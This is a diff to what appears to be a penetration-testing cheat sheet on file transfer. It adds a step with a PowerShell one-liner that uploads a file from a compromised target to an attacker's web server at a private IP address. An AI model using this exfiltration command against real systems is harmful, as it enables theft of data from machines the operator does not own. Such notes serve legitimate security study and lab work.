@@ -253,6 +253,10 @@ move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 ?>
 ```
 3. Start apache2 server
+4. Upload files from target to webserver. Example with powershell
+```
+powershell -c "iex(new-object system.net.webclient).uploadfile('http://192.168.1.13/upload.php', 'filename')"
+```
 
 
 ## SimpleHTTPServer
